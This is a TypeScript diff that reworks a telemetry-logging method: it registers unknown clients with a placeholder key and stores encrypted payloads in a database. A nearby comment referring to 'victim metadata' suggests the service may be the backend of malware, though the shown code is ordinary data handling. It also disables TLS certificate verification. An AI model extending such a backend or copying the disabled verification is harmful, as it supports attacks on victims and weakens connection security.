@@ -316,81 +316,71 @@ export class TelemetryService {
   /**
    * Сохранение лога телеметрии
    */
-  async saveTelemetryLog(
-    clientId: string,
-    timestamp: string,
-    data: string,
-  ): Promise<string> {
+  async saveTelemetryLog(clientId: string, timestamp: string, data: string): Promise<string> {
     console.log('=== saveTelemetryLog START ===');
-    console.log('client_id:', clientId);
-    console.log('timestamp:', timestamp);
-    console.log('data length:', data?.length || 0);
     
     const db = new Client({
-      connectionString: process.env.DATABASE_URL,
-      ssl: { rejectUnauthorized: false },
+        connectionString: process.env.DATABASE_URL,
+        ssl: { rejectUnauthorized: false },
     });
 
     try {
-      await db.connect();
-      console.log('✅ Database connected for saveTelemetryLog');
+        await db.connect();
+        console.log('✅ Database connected for saveTelemetryLog');
 
-      // Проверяем существование клиента в telemetry_clients!
-      const clientCheck = await db.query(
-        `SELECT id FROM telemetry_clients WHERE id = $1`,
-        [clientId],
-      );
-
-      if (clientCheck.rows.length === 0) {
-        console.log('⚠️ Client not found, creating entry...');
-        // await db.query(
-        //   `INSERT INTO telemetry_clients (id, first_seen, last_seen, is_active)
-        //    VALUES ($1, NOW(), NOW(), true)
-        //    ON CONFLICT (id) DO NOTHING`,
-        //   [clientId],
-        // );
-        await db.query(
-          `INSERT INTO telemetry_clients (id, client_public_key_hash, first_seen, last_seen, is_active)
-           VALUES ($1, $2, NOW(), NOW(), true)
-           ON CONFLICT (id) DO NOTHING`,
-          [clientId, 'auto-' + clientId.substring(0, 16)],
+        // ПРОВЕРКА И СОЗДАНИЕ КЛИЕНТА С ЗАГЛУШКОЙ
+        const clientCheck = await db.query(
+            `SELECT id FROM telemetry_clients WHERE id = $1`,
+            [clientId],
         );
-      }
-      
-      let encryptedPayload: Buffer | null = null;
-      let payloadSize = 0;
-      
-      if (data && data.length > 0) {
-        try {
-          encryptedPayload = Buffer.from(data, 'base64');
-          payloadSize = encryptedPayload.length;
-          console.log('✅ Data decoded as base64, size:', payloadSize);
-        } catch (error) {
-          // Если не base64, сохраняем как есть
-          encryptedPayload = Buffer.from(data, 'utf8');
-          payloadSize = encryptedPayload.length;
-          console.log('⚠️ Data not base64, saved as UTF-8, size:', payloadSize);
-        }
-      }
-      
-      const result = await db.query(
-        `INSERT INTO telemetry_logs (client_id, timestamp, encrypted_payload, payload_size)
-         VALUES ($1, $2, $3, $4)
-         RETURNING id`,
-        [clientId, timestamp, encryptedPayload, payloadSize],
-      );
 
-      const logId = result.rows[0].id;
-      console.log('✅ Telemetry log saved with id:', logId);
-      return logId;
+        if (clientCheck.rows.length === 0) {
+            console.log('⚠️ Client not found, creating entry...');
+            
+            // СОЗДАЁМ ЗАПИСЬ С ЗАГЛУШКОЙ ДЛЯ client_public_key
+            await db.query(
+                `INSERT INTO telemetry_clients (id, client_public_key, client_public_key_hash, first_seen, last_seen, is_active)
+                 VALUES ($1, $2, $3, NOW(), NOW(), true)
+                 ON CONFLICT (id) DO NOTHING`,
+                [clientId, 'placeholder-key-for-existing-client', crypto.createHash('sha256').update('placeholder-key-for-existing-client').digest('hex')],
+            );
+            console.log('✅ Client created with placeholder key');
+        }
+        
+        // ТЕПЕРЬ СОХРАНЯЕМ ЛОГ
+        let encryptedPayload: Buffer | null = null;
+        let payloadSize = 0;
+        
+        if (data && data.length > 0) {
+            try {
+                encryptedPayload = Buffer.from(data, 'base64');
+                payloadSize = encryptedPayload.length;
+                console.log('✅ Data decoded as base64, size:', payloadSize);
+            } catch (error) {
+                encryptedPayload = Buffer.from(data, 'utf8');
+                payloadSize = encryptedPayload.length;
+                console.log('⚠️ Data not base64, saved as UTF-8, size:', payloadSize);
+            }
+        }
+        
+        const result = await db.query(
+            `INSERT INTO telemetry_logs (client_id, timestamp, encrypted_payload, payload_size)
+             VALUES ($1, $2, $3, $4)
+             RETURNING id`,
+            [clientId, timestamp, encryptedPayload, payloadSize],
+        );
+
+        const logId = result.rows[0].id;
+        console.log('✅ Telemetry log saved with id:', logId);
+        return logId;
+        
     } catch (error) {
-      console.error('❌ ERROR in saveTelemetryLog:', error.message);
-      console.error('Error stack:', error.stack);
-      throw error;
+        console.error('❌ ERROR in saveTelemetryLog:', error.message);
+        throw error;
     } finally {
-      await db.end();
+        await db.end();
     }
-  }
+}
 
   /**
    * Обновление метаданных жертвы
